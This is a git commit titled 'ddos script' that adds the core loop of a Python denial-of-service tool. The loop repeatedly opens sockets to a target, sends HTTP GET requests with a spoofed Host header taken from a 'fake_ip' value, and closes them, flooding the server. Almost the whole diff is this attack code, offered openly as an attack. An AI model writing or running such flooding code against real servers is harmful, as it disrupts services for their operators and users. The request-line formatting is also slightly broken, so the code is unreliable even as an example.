80c8d3ef809ad4a6a2c5146ad123e5a083295158
dithermedaddy <moi@faanross.com>
2023-01-11 08:31:12 -0500

    ddos script

--- ddos.py
+++ ddos.py
@@ -9,7 +9,10 @@ fake_ip = '66.6.69.42'
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect
+        s.connect((target, port))
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
 
 
 
